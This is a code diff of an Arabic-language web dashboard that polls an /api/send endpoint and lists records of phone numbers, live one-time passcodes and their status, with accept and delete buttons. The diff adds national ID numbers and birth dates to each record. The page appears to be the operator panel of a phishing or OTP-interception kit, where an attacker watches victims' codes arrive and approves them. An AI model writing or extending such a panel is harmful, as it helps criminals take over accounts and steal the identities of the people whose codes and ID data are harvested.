@@ -9,18 +9,16 @@
         body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f0f2f5; padding: 20px; direction: rtl; }
         .container { max-width: 800px; margin: 0 auto; }
         h2 { text-align: center; color: #1a1a1a; margin-bottom: 30px; border-bottom: 2px solid #FFD700; padding-bottom: 10px; }
-        .card { background: #fff; padding: 20px; margin-bottom: 15px; border-radius: 12px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 4px 12px rgba(0,0,0,0.05); border: 1px solid #e1e4e8; animation: fadeIn 0.5s ease; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .card { background: #fff; padding: 20px; margin-bottom: 15px; border-radius: 12px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 4px 12px rgba(0,0,0,0.05); border: 1px solid #e1e4e8; }
         .info { flex-grow: 1; }
-        .info div { margin-bottom: 8px; font-size: 18px; color: #333; }
+        .info div { margin-bottom: 8px; font-size: 16px; color: #333; }
         .phone { color: #007bff; font-weight: bold; font-size: 20px; }
-        .otp { color: #ff3b30; font-weight: bold; background: #fff3f3; padding: 4px 12px; border-radius: 6px; border: 1px solid #ffcccc; font-family: monospace; }
+        .otp { color: #ff3b30; font-weight: bold; background: #fff3f3; padding: 4px 12px; border-radius: 6px; border: 1px solid #ffcccc; }
+        .identity-data { background: #f9f9f9; padding: 8px; border-radius: 8px; border-right: 3px solid #FFD700; margin-top: 10px; }
         .actions { display: flex; gap: 10px; }
-        .btn { padding: 12px 24px; border-radius: 10px; border: none; cursor: pointer; font-weight: bold; transition: 0.3s; font-size: 14px; }
+        .btn { padding: 12px 24px; border-radius: 10px; border: none; cursor: pointer; font-weight: bold; transition: 0.3s; }
         .accept { background: #28a745; color: white; }
-        .accept:hover { background: #218838; transform: scale(1.05); }
         .reject { background: #dc3545; color: white; }
-        .reject:hover { background: #c82333; transform: scale(1.05); }
         .no-data { text-align: center; padding: 100px 20px; color: #888; background: white; border-radius: 15px; }
     </style>
 </head>
@@ -36,10 +34,9 @@
 <script>
     const dataList = document.getElementById('dataList');
 
-    // دالة جلب البيانات من الـ API
     async function fetchData() {
         try {
-            const response = await fetch('/api/send'); // طلب GET
+            const response = await fetch('/api/send');
             const users = await response.json();
             
             dataList.innerHTML = "";
@@ -56,7 +53,11 @@
                     <div class="info">
                         <div>جوال: <span class="phone">${data.phone || '---'}</span></div>
                         <div>الرمز: <span class="otp">${data.otp || 'بانتظار...'}</span></div>
-                        <div>الحالة: <span style="color:${data.status === 'accepted' ? 'green' : 'orange'}">${data.status || 'pending'}</span></div>
+                        <div class="identity-data">
+                            <div>الهوية: <b>${data.identityNumber || 'لم يتم الإدخال'}</b></div>
+                            <div>تاريخ الميلاد: <b>${data.birthDate || '---'}</b></div>
+                        </div>
+                        <div style="margin-top:10px">الحالة: <span style="color:${data.status === 'accepted' ? 'green' : 'orange'}">${data.status || 'pending'}</span></div>
                     </div>
                     <div class="actions">
                         <button class="btn accept" onclick="acceptUser('${data.id}')">قبول</button>
@@ -66,50 +67,33 @@
                 dataList.appendChild(card);
             });
         } catch (e) {
-            console.error("Error:", e);
             dataList.innerHTML = '<div class="no-data">خطأ في الاتصال بالخادم.</div>';
         }
     }
 
-    // دالة القبول (إرسال PATCH للـ API)
     async function acceptUser(id) {
-        try {
-            const response = await fetch('/api/send', {
-                method: 'PATCH',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ id: id, status: 'accepted' })
-            });
-            
-            if (response.ok) {
-                alert("تم قبول المستخدم بنجاح!");
-                fetchData(); // تحديث القائمة فوراً
-            }
-        } catch (e) {
-            alert("حدث خطأ أثناء الاتصال.");
-        }
+        await fetch('/api/send', {
+            method: 'PATCH',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ id: id, status: 'accepted' })
+        });
+        fetchData();
     }
 
-    // دالة الحذف (إرسال DELETE للـ API)
     async function deleteUser(id) {
-        if(confirm('هل أنت متأكد من حذف هذا السجل؟')) {
-            try {
-                await fetch('/api/send', {
-                    method: 'DELETE',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ id: id })
-                });
-                fetchData(); // تحديث القائمة فوراً
-            } catch (e) {
-                alert("حدث خطأ أثناء الحذف.");
-            }
+        if(confirm('حذف هذا السجل؟')) {
+            await fetch('/api/send', {
+                method: 'DELETE',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ id: id })
+            });
+            fetchData();
         }
     }
 
-    // تحديث تلقائي كل 5 ثوانٍ
     fetchData();
     setInterval(fetchData, 5000);
 </script>
-
 
 </body>
 </html>
